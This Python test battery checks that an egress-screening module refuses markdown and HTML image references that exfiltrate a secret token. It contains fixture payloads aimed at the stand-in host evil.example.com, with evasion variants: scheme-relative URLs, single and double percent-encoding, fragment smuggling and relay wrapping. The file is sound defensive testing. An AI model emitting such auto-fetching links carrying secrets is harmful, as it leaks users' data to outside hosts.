"""Wave-275 F288/F289 closure battery: egress_refs scheme-relative and
percent-encoding fixes.

Closes (2026-10-01, wave-275 lane A):
  F288 -- scheme-relative URLs (//host/...) treated as https-external
          and screened, never "not-external"; relay inner-target path
          resolves scheme-relative inners the same way.
  F289 -- direct-ref query/fragment percent-DECODED (query form
          semantics, fragment literal) before digest tokenization;
          bounded-iterative decode defeats single- and double-encoding.

Red-first: with EGRESS_IMPL=stub the battery runs a battery-local
permissive foil (extracts inline refs only, never refuses), so every
attack probe must BREAK (verdict "allow"). Against the real module
every attack probe must be HELD (verdict "refuse" with the coded
refusal) and every control probe must be HELD (verdict "allow").

Deterministic: fixed fixtures, no clock, no randomness. Module-level
staging default. Depth-1 green check honoring GOV_SKIP_GREEN. No
in-repo git subprocesses. Fresh /var/tmp/g275* TMPDIRs.
"""

import hashlib
import os
import re
import sys
import urllib.parse

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

import subprocess  # noqa: E402
import tempfile  # noqa: E402

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

TAXONOMY_PIN = 1750  # Wave-274 merge: pin 1458 -> 1477 (+3 provlabel-* + 8 rail-* + 3 decodetrust-* + 5 attestor-*).; Wave-280 merge: pin 1495 -> 1541 (+13 battery-lang-* +1 delegation-ephemeral-grant-refused +32 shield/evaltask-*); Wave-281 lane 9: pin 1541 -> 1551 (+10 guardplugin-*); Wave-283 lane 5: pin 1579 -> 1581 (+2 finding-*).; Wave-283 merge: pin 1581 -> 1587 (+6 inventory-*).; Wave-284 lane 1: pin 1587 -> 1588 (+1 discovery-emit-failed).; Wave-284 merge: pin 1588 -> 1621 (+1 discovery-emit-failed +4 manifest-* +7 guac-graph-* +8 envelope-*/recipient-policy +6 sandbox-policy-* +8 keyset-*).; Wave-286 merge: pin 1641 -> 1660; Wave-287 merge: pin 1660 -> 1684 (+7 tsa-* +7 evidence-provenance +10 trustvec-*) (+1 manifest-regex-unsafe +1 keyset-pin-key-invalid +6 receipt-* +11 toolcall-*).; Wave-288 merge: pin 1684 -> 1700 (+16: 1 toolcall-exception-scope-mismatch +1 toolcall-regex-unsafe +1 toolcall-invalid-call +7 admission-* +6 posture-*); Wave-289 merge: pin 1700 -> 1706 (+6 challenge-*); Wave-293 merge: pin 1730 -> 1730 (renumber F361->F364, no new codes). Wave-294 merge: pin 1730 -> 1742 (+12: 4 coord-lease-* + 4 toolcall/toolfilter-* + 4 toolcall-schema-*); Wave-295 lane 1: pin 1742 -> 1743 (+1 toolcall-secret-scan-incomplete); Wave-295 merge: pin 1743 -> 1750 (+8: 1 toolcall-secret-scan-incomplete + 3 toolcall-predicate-* + 4 coord-state-*)

# ---------------------------------------------------------------------------
# Fixtures (fixed, deterministic)
# ---------------------------------------------------------------------------

SECRET = "CLOSURE-TOKEN-9d4f2a7c1e"
TOKEN_DIGEST = hashlib.sha256(SECRET.encode("utf-8")).hexdigest()

SPACED = "SPACED CLOSURE SECRET 4b9e"
SPACED_DIGEST = hashlib.sha256(SPACED.encode("utf-8")).hexdigest()

RELAY_HOST = "relay.example.com"
RELAY_PREFIX = "/urlp"
ALLOWED = ("cdn.example.com",)


def _enc1(text):
    """Single percent-encoding of every byte."""
    return "".join("%%%02X" % b for b in text.encode("utf-8"))


def _enc2(text):
    """Double percent-encoding of every byte."""
    return _enc1(_enc1(text))


# ---------------------------------------------------------------------------
# Foil (red phase): battery-local permissive screener. Extracts inline
# refs only and never refuses.
# ---------------------------------------------------------------------------

_INLINE_RE = re.compile(r"!?\[[^\]]*\]\(([^)\s]+)\)")


class _FoilChannel(object):
    channel_kind = "markdown-auto-fetch"

    def extract_refs(self, content):
        refs = []
        for m in _INLINE_RE.finditer(content):
            refs.append({"kind": "link-inline", "text": "",
                         "url": m.group(1), "line": 1,
                         "provenance": "rendered"})
        return refs


class _FoilPolicy(object):
    def __init__(self, **kw):
        pass


def _foil_screen(content, policy):
    refs = _FoilChannel().extract_refs(
        content if isinstance(content, str) else "")
    return {"verdict": "allow", "code": None, "refs": refs,
            "flagged": [], "checks": ["foil-allow-all"],
            "evidence": {"ref_count": len(refs)},
            "out_of_scope": []}


if os.environ.get("EGRESS_IMPL") == "stub":
    class _FoilModule(object):
        EgressPolicy = _FoilPolicy
        MarkdownAutoFetchChannel = _FoilChannel

        @staticmethod
        def extract_egress_refs(content, channels=None, now=None):
            refs = _FoilChannel().extract_refs(
                content if isinstance(content, str) else "")
            return {"verdict": "ok", "refs": refs}

        @staticmethod
        def screen_egress_refs(content, policy=None, now=None):
            return _foil_screen(content, policy)

    er = _FoilModule()
    _REAL = False
else:
    from gov import egress_refs as er  # noqa: E402
    _REAL = True


def _policy(digests=(TOKEN_DIGEST,)):
    return er.EgressPolicy(
        trusted_relays=[(RELAY_HOST, RELAY_PREFIX)],
        allowed_hosts=ALLOWED,
        sensitive_digests=frozenset(digests),
    )


RESULTS = []


def probe(name, fn):
    try:
        held, detail = fn()
    except Exception as e:  # noqa: BLE001
        RESULTS.append((name, "ERROR", "harness error: %r" % (e,)))
        return
    RESULTS.append((name, "HELD" if held else "BREAK", detail))


def _is_refuse(rec, code):
    return rec.get("verdict") == "refuse" and rec.get("code") == code


def _is_allow(rec):
    return rec.get("verdict") == "allow"


# ---------------------------------------------------------------------------
# F288 attacks: scheme-relative refs must be screened as https-external.
# ---------------------------------------------------------------------------

def f288_scheme_relative_digest():
    """Scheme-relative image ref carrying the sensitive token refuses
    egress-ref-data-exfil (the eg01 shape, closed)."""
    content = "![x](//evil.example.com/collect?token=%s)" % SECRET
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f288_scheme_relative_relay_inner():
    """Relay-wrapped inner target that is scheme-relative must be
    resolved as external and refused egress-relay-exfil (F288 H3)."""
    inner = "//evil.example.com/collect?token=" + SECRET
    content = ("![x](https://%s%s?url=%s)"
               % (RELAY_HOST, RELAY_PREFIX,
                  urllib.parse.quote(inner, safe="")))
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-relay-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f288_scheme_relative_oversize():
    """Scheme-relative ref with an oversized payload trips the size
    leg too (the https-external treatment is complete, not digest
    only)."""
    content = "![x](//evil.example.com/c?d=%s)" % ("q" * 700)
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f288_scheme_relative_html_img():
    """HTML <img> with a scheme-relative src is the same client
    auto-fetch shape -- screened, not waved through."""
    content = '<img src="//evil.example.com/p.png?tok=%s">' % SECRET
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


# ---------------------------------------------------------------------------
# F289 attacks: encoded digest tokens on direct refs.
# ---------------------------------------------------------------------------

def f289_single_encoded_direct():
    """Percent-encoded sensitive token on a direct ref refuses
    (the eg02 shape, closed)."""
    content = ("![x](https://evil.example.com/collect?token=%s)"
               % _enc1(SECRET))
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f289_double_encoded_direct():
    """Double percent-encoding cannot re-arm the digest leg."""
    content = ("![x](https://evil.example.com/collect?token=%s)"
               % _enc2(SECRET))
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f289_encoded_fragment():
    """The token smuggled in the FRAGMENT (percent-encoded) is
    decoded with fragment semantics and refused."""
    content = ("![x](https://evil.example.com/x#tok=%s)"
               % _enc1(SECRET))
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f289_plus_vs_percent20_parity():
    """F289 H4: `+` and `%20` encodings of the same value decode to the
    same server-side view and get the same verdict (query form
    semantics). Falsifiable parity: all three forms agree."""
    pol = _policy(digests=(SPACED_DIGEST,))
    base = "https://evil.example.com/c?token=%s"
    r_plain = er.screen_egress_refs("![x](%s)" % (base % SPACED), pol)
    r_plus = er.screen_egress_refs(
        "![x](%s)" % (base % urllib.parse.quote_plus(SPACED, safe="")),
        pol)
    r_pct = er.screen_egress_refs(
        "![x](%s)" % (base % urllib.parse.quote(SPACED, safe="")), pol)
    verdicts = [(r["verdict"], r["code"])
                for r in (r_plain, r_plus, r_pct)]
    ok = verdicts[0] == verdicts[1] == verdicts[2]
    return ok, "plain=%r plus=%r pct20=%r" % tuple(verdicts)


def f289_encoded_relay_still_refuses():
    """The relay leg keeps its e08 discipline: encoded inner token
    refuses egress-relay-exfil (unchanged by the direct-leg fix)."""
    inner = "https://evil.example.com/collect?token=" + _enc1(SECRET)
    content = ("![x](https://%s%s?url=%s)"
               % (RELAY_HOST, RELAY_PREFIX,
                  urllib.parse.quote(inner, safe="")))
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-relay-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


def f289_encoded_oversize_still_trips():
    """The size leg runs on the raw (encoding-inflated) query: an
    encoded-but-oversized payload still refuses."""
    content = "![x](https://evil.example.com/c?d=%s)" % _enc1("z" * 400)
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec, "egress-ref-data-exfil")
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                      rec.get("code"))


# ---------------------------------------------------------------------------
# Controls: must be HELD (allow) on both foil and real module.
# ---------------------------------------------------------------------------

def c01_relative_refs_allowed():
    """Anti-FP pin (F288 close-when 4): genuinely relative refs --
    path, fragment, bare filename -- stay not-external/allowed."""
    content = "[x](/local/path) and [y](#frag) and ![z](img.png)"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s code=%s" % (rec.get("verdict"),
                                                  rec.get("code"))


def c02_allowed_host_scheme_relative():
    """Scheme-relative ref to an allow-listed host passes (the
    allowed-host leg applies to the resolved host)."""
    content = "![logo](//cdn.example.com/logo.png?v=12)"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s code=%s" % (rec.get("verdict"),
                                                  rec.get("code"))


def c03_benign_encoded_allowed():
    """Anti-FP pin (F289 close-when 4): decoding must not create
    digest matches from benign encoded text -- the decoded view is
    what the server receives, and %41%42%43 is just 'ABC'."""
    content = "![x](https://evil.example.com/search?q=%41%42%43)"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s code=%s" % (rec.get("verdict"),
                                                  rec.get("code"))


def c04_relay_external_inner_clean():
    """Anti-FP pin carried forward: relay to an external article with a
    short clean query still passes."""
    inner = "https://news.example/article?id=42"
    content = ("[news](https://%s%s?url=%s)"
               % (RELAY_HOST, RELAY_PREFIX,
                  urllib.parse.quote(inner, safe="")))
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s code=%s" % (rec.get("verdict"),
                                                  rec.get("code"))


def c05_scheme_relative_clean_external():
    """Scheme-relative ref to an external host with a short clean
    query is not exfil-shaped and passes (screening, not blanket
    block)."""
    content = "![x](//images.example/photo.jpg?w=80)"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s code=%s" % (rec.get("verdict"),
                                                  rec.get("code"))


def c_pin_check():
    src = open(os.path.join(os.path.dirname(__file__), "..",
                            "gov", "decision_codes.py")).read()
    codes = re.findall(r'"code":\s*[\'"]([a-z][a-z0-9-_.]*)[\'"]', src)
    held = (len(codes) == TAXONOMY_PIN
            and len(set(codes)) == TAXONOMY_PIN)
    return held, "%d/%d unique, pin %d" % (len(codes), len(set(codes)),
                                          TAXONOMY_PIN)


def green_check():
    """Depth-1: unit suite with GOV_SKIP_GREEN=1."""
    if os.environ.get("GOV_SKIP_GREEN") == "1":
        return True, "skipped (GOV_SKIP_GREEN=1)"
    root = os.path.join(os.path.dirname(__file__), "..")
    env = dict(os.environ)
    env["GOV_SKIP_GREEN"] = "1"
    tmp = tempfile.mkdtemp(prefix="g275-green-")
    env["TMPDIR"] = tmp
    env["GOV_RUN_ROOT"] = tmp
    py = sys.executable
    r = subprocess.run([py, "-m", "unittest", "tests.test_egress_refs"],
                       cwd=root, env=env, capture_output=True,
                       text=True, timeout=600)
    return r.returncode == 0, "test_egress_refs rc=%d" % (r.returncode,)


def main():
    for name, fn in [
        # F288 attacks (foil: BREAK / real: HELD)
        ("f288-scheme-relative-digest", f288_scheme_relative_digest),
        ("f288-scheme-relative-relay-inner",
         f288_scheme_relative_relay_inner),
        ("f288-scheme-relative-oversize", f288_scheme_relative_oversize),
        ("f288-scheme-relative-html-img", f288_scheme_relative_html_img),
        # F289 attacks (foil: BREAK / real: HELD)
        ("f289-single-encoded-direct", f289_single_encoded_direct),
        ("f289-double-encoded-direct", f289_double_encoded_direct),
        ("f289-encoded-fragment", f289_encoded_fragment),
        ("f289-plus-vs-percent20-parity",
         f289_plus_vs_percent20_parity),
        ("f289-encoded-relay-still-refuses",
         f289_encoded_relay_still_refuses),
        ("f289-encoded-oversize-still-trips",
         f289_encoded_oversize_still_trips),
        # Controls (foil + real: HELD)
        ("c01-relative-refs-allowed", c01_relative_refs_allowed),
        ("c02-allowed-host-scheme-relative",
         c02_allowed_host_scheme_relative),
        ("c03-benign-encoded-allowed", c03_benign_encoded_allowed),
        ("c04-relay-external-inner-clean", c04_relay_external_inner_clean),
        ("c05-scheme-relative-clean-external",
         c05_scheme_relative_clean_external),
        ("c-pin-check", c_pin_check),
    ]:
        probe(name, fn)
    held_n = sum(1 for _, s, _ in RESULTS if s == "HELD")
    break_n = sum(1 for _, s, _ in RESULTS if s == "BREAK")
    err_n = sum(1 for _, s, _ in RESULTS if s == "ERROR")
    print("w275 F288/F289 closure battery: %d HELD / %d BREAK / %d ERROR "
          "(TMPDIR=%s)" % (held_n, break_n, err_n,
                           os.environ.get("TMPDIR", "")))
    for name, status, detail in RESULTS:
        if status != "HELD":
            print("  [%s] %s: %s" % (status, name, detail))
    gc_ok, gc_note = green_check()
    print("green check: %s (%s)" % ("ok" if gc_ok else "FAIL", gc_note))
    if not _REAL:
        # Foil run: attack probes must BREAK; the parity probe,
        # controls and the pin check must HELD (the foil allows
        # everything, so parity holds trivially).
        names = [n for n, _, _ in RESULTS]
        attacks = [s for n, s, _ in RESULTS
                   if n.startswith(("f288-", "f289-"))
                   and n != "f289-plus-vs-percent20-parity"]
        rest = [s for n, s, _ in RESULTS
                if n not in [a for a, _, _ in RESULTS
                             if a.startswith(("f288-", "f289-"))
                             and a != "f289-plus-vs-percent20-parity"]]
        red_ok = (all(s == "BREAK" for s in attacks)
                  and all(s == "HELD" for s in rest))
        print("RED phase (foil): %s (%d attacks BREAK, %d rest HELD)"
              % ("ok" if red_ok else "FAIL", len(attacks), len(rest)))
        return 0 if red_ok else 1
    failures = break_n + err_n + (0 if gc_ok else 1)
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
